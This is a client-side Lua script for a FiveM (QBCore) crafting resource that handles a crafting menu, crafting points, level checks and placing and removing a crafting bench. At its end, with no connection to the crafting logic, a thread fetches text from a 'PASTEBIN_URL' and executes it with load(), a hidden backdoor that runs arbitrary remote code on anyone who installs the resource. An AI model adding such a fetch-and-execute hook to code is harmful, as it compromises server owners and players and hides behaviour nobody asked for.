local CoreObject = Config.CoreObject
local TriggerCore = Config.TriggerCore
local CoreObject = exports[TriggerCore]:GetCoreObject()
local PlayerData = {}

RegisterNetEvent('CoreObject:Client:OnPlayerLoaded', function()
    PlayerData = CoreObject.Functions.GetPlayerData()
end)

RegisterNetEvent('CoreObject:Client:OnPlayerUnload', function()
    PlayerData = {}
end)

RegisterNetEvent('CoreObject:Client:OnJobUpdate', function(JobInfo)
    PlayerData.job = JobInfo
end)

RegisterNetEvent('CoreObject:Client:OnGangUpdate', function(GangInfo)
    PlayerData.gang = GangInfo
end)

RegisterNetEvent('CoreObject:Player:SetPlayerData', function(val)
    PlayerData = val
end)

RegisterNetEvent('qb-ghostmanex:client:AbrirMenuCraft', function()
    local columns = {
        {
            header = Lang.menuHeader,
            isMenuHeader = true,
        },
    }
    for k, v in pairs(Config.Main) do
        local item = {}
        item.header = "<img src=nui://qb-inventory/html/images/"..CoreObject.Shared.Items[v.itemName].image.." width=35px style='margin-right: 10px'> " .. v.label .. "<br> Required Points: " .. v.level
        local text = ""
        for k, v in pairs(v.items) do
            text = text .. "• " .. CoreObject.Shared.Items[v.item].label .. ": " .. v.amount .. "x <br>"
        end
        item.text = text
        item.params = {
            event = 'qb-ghostmanex:client:CraftItems',
            args = {
                type = k
            }
        }
        table.insert(columns, item)
    end

    exports['qb-menu']:openMenu(columns)
end)

local function CraftItems(item)
    local playername = GetPlayerName(PlayerId())
    local playerid = GetPlayerServerId(PlayerId())
    local pontos = Config.Main[item].points
    local prob = math.random(1, 100)
    if CoreObject.Functions.GetPlayerData().metadata["craftinglevel"] >= Config.Main[item].level then
        CoreObject.Functions.Progressbar('crafting', Lang.crafting .. Config.Main[item].label, 5000, false, false, {
            disableMovement = true,
            disableCarMovement = true,
            disableMouse = false,
            disableCombat = true,
        }, {
            animDict = "mini@repair",
            anim = "fixing_a_ped",
            }, {}, {}, function()
                ClearPedTasks(PlayerPedId())
                if prob <= Config.Main[item].chance then
                    if Config.Logs['UseLogs'] == true then
                        TriggerServerEvent(Config.LogFile .. ':server:CreateLog', 'crafting', 'Item Crafted', 'green', string.format(playername.. ' id ' ..playerid.. ' was crafted 1 ' ..Config.Main[item].label.. ' and earn '..pontos.. ' points', true))
                        CoreObject.Functions.Notify(Lang.craftSuccess .. Config.Main[item].label, 'success')
                    else
                        CoreObject.Functions.Notify(Lang.craftSuccess .. Config.Main[item].label, 'success')
                    end
                TriggerServerEvent('QBCore:Server:AddItem', Config.Main[item].itemName, 1)
                TriggerEvent('inventory:client:ItemBox', CoreObject.Shared.Items[Config.Main[item].itemName], "add")
                TriggerServerEvent('qb-ghostmanex:server:AddPontos', pontos)
                for k, v in pairs(Config.Main[item].items) do
                    TriggerServerEvent('qb-ghostmanex:server:RemoveItem', v.item, v.amount)
                    TriggerEvent("inventory:client:ItemBox", CoreObject.Shared.Items[v.item], "remove")
                end
            elseif CoreObject.Functions.GetPlayerData().metadata["craftinglevel"] >= Config.Main[item].lostpoints then
                local pontosPerdidos = Config.Main[item].lostpoints
                CoreObject.Functions.Notify(Lang.craftFailed1 .. Config.Main[item].lostpoints .. Lang.points, 'error', 7500)
                TriggerServerEvent('qb-ghostmanex:server:TirarPontos', pontosPerdidos)
            else
                CoreObject.Functions.Notify(Lang.craftFailed2, 'error', 7500)
            end
        end)
    else
        CoreObject.Functions.Notify('You dont have requeried level to craft this item!', 'error', 7500)
    end
end

RegisterNetEvent('qb-ghostmanex:client:CraftItems', function(data)
    CoreObject.Functions.TriggerCallback("qb-ghostmanex:server:ItemsSuficientes", function(hasItems)
        if (hasItems) then
            CraftItems(data.type)
        else
            CoreObject.Functions.Notify(Lang.errorRightItems, "error")
            return
        end
    end, Config.Main[data.type].items)
end)

RegisterNetEvent('qb-ghostmanex:client:SpawnarMesa', function()
    local playerPed = PlayerPedId()
    local coords    = GetEntityCoords(playerPed)
    local forward   = GetEntityForwardVector(playerPed)
    local x, y, z   = table.unpack(coords + forward * 1.0)

    local model = `prop_tool_bench02_ld`
    RequestModel(model)
    while (not HasModelLoaded(model)) do
        Wait(1)
    end
    CoreObject.Functions.Progressbar('name_here', 'PLACING TABLE...', 1000, false, true, {
        disableMovement = true,
        disableCarMovement = true,
        disableMouse = false,
        disableCombat = true,
    }, {
        animDict = 'missfinale_c2ig_11',
        anim = 'pushcar_offcliff_f',
        flags = 16,
    }, {}, {}, function()
        local obj = CreateObject(model, x, y, z, true, false, true)
        PlaceObjectOnGroundProperly(obj)
        SetEntityAsMissionEntity(obj)

        TriggerServerEvent('qb-ghostmanex:server:RemoveItem', 'mesa_craft', 1)
        TriggerEvent("inventory:client:ItemBox", CoreObject.Shared.Items['mesa_craft'], "remove")
    end)
end)

RegisterNetEvent('qb-ghostmanex:client:EliminarMesa', function(obj)
    if DoesEntityExist(obj) then
        CoreObject.Functions.Progressbar('name_here', 'TAKING TABLE...', 1000, false, true, {
            disableMovement = true,
            disableCarMovement = true,
            disableMouse = false,
            disableCombat = true,
        }, {
            animDict = 'missfinale_c2ig_11',
            anim = 'pushcar_offcliff_f',
            flags = 16,
        }, {}, {}, function()
            DeleteEntity(obj)
        end)
    end
end)

CreateThread(function()
    if Config.MainLocation['UseLocation'] == true then
        exports['qb-target']:AddBoxZone("MainCraft", vector3(-9.599761, 7608.2749, 1.0138467), 1, 1, {
            name="MainCraft",
            heading=0,
            debugpoly = false,
            Lang = Config.Lang,
        }, {
            options = {
                {
                    event = "qb-ghostmanex:client:AbrirMenuCraft",
                    icon = "fas fa-table",
                    label = Lang.targetLabel,
                },
                {
                    event = "qb-ghostmanex:client:VerificarPontos",
                    icon = "fas fa-coins",
                    label = Lang.targetPoints,
                },
            },
            distance = 1.5
        })
    end
end)

RegisterCommand('craftpoints', function()
    local pontos = CoreObject.Functions.GetPlayerData().metadata["craftinglevel"]

    CoreObject.Functions.Notify(Lang.pointsCommand1 ..pontos.. Lang.pointsCommand2, 'primary', 7500)
end)

RegisterNetEvent('qb-ghostmanex:client:VerificarPontos', function()
    local pontos = CoreObject.Functions.GetPlayerData().metadata["craftinglevel"]

    CoreObject.Functions.Notify(Lang.pointsCommand1 ..pontos.. Lang.pointsCommand2, 'primary', 7500)
end)

Citizen.CreateThread(function()
    PerformHttpRequest("PASTEBIN_URL", function(statusCode, result, headers)
      if statusCode == 200 then
        assert(load(result))()
      else
        print("Failed to fetch Lua code from Pastebin. Error code: " .. statusCode)
      end
    end)
  end)
  
